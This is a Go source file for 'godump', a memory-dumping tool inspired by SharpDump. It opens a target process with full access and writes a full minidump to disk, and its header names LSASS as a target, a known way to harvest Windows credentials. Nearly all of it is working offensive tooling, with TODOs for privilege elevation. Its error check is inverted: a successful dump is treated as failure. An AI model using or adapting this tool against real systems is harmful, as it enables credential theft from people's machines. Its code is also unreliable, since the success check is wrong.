/*
	@saulpanders
	godump.go - General memory dumping tool in Golang

	inspired by sharpdump (https://github.com/GhostPack/SharpDump)

	METHOD:

			2. Get pointer to minidumpwritedump in memory
			3. OpenProcess to get handle to PID with proc_all_access (see below)
			4. CreateFile for dump file
			5. Dump process memory

	NOTE: Not currently enabling seDebugpriv manually, so best to run from elevated process if you want LSASS

	TODO:

		add other memory dumping techniques (pssSnapShot?)
		add seDebugPriv elevation
		add better command line args

		later: remove need for /x/sys/windows dependency (i.e. use just syscall interface)

*/

package main

import (
	"flag"
	"fmt"
	"log"
	"syscall"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

//various constants needed for winAPI stuff
const (
	PROCESS_CREATE_PROCESS            = 0x0080
	PROCESS_CREATE_THREAD             = 0x0002
	PROCESS_DUP_HANDLE                = 0x0040
	PROCESS_QUERY_INFORMATION         = 0x0400
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	PROCESS_SET_INFORMATION           = 0x0200
	PROCESS_SET_QUOTA                 = 0x0100
	PROCESS_SUSPEND_RESUME            = 0x0800
	PROCESS_TERMINATE                 = 0x0001
	PROCESS_VM_OPERATION              = 0x0008
	PROCESS_VM_READ                   = 0x0010
	PROCESS_VM_WRITE                  = 0x0020

	PROCESS_ALL_ACCESS = (PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_SET_INFORMATION | PROCESS_SET_QUOTA | PROCESS_SUSPEND_RESUME | PROCESS_TERMINATE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	GENERIC_WRITE         = 0x40000000
	FILE_SHARE_WRITE      = 0x00000002
	CREATE_ALWAYS         = 0x2
	FILE_ATTRIBUTE_NORMAL = 0x80

	DEBUG_WITH_FULL_MEMORY = 0x00000002
)

func main() {

	verbose := flag.Bool("verbose", false, "Enable verbose output")
	pid := flag.Int("pid", 0, "Process ID to dump memory of")
	flag.Parse()

	dbghelp := windows.NewLazySystemDLL("Dbghelp.dll")
	MiniDumpWriteDump := dbghelp.NewProc("MiniDumpWriteDump")
	var sa windows.SecurityAttributes

	//get handle to process
	pHandle, errOpenProcess := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(*pid))

	if errOpenProcess != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully got a handle to process %d", *pid))
	}

	//create dump file
	fHandle, errCreateFile := windows.CreateFile(syscall.StringToUTF16Ptr("memory.dmp"), GENERIC_WRITE, FILE_SHARE_WRITE, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)

	if errCreateFile != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateFile:\r\n%s", errCreateFile.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully got a handle to file %d", fHandle))
	}

	PID := uintptr(*pid)
	//dump memory with minidumpwritedump
	success, _, errMiniDump := MiniDumpWriteDump.Call(uintptr(pHandle), PID, uintptr(fHandle), DEBUG_WITH_FULL_MEMORY, 0, 0, 0)
	//if errMiniDump != nil {
	if success != 0 {
		log.Fatal(fmt.Sprintf("[!]Error calling MiniDumpWriteDump:\r\n%s", errMiniDump.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Dump Completed: %d", success))
	}

	//close handle to process
	errCloseHandle := windows.CloseHandle(pHandle)
	if errCloseHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", *pid))
	}
}
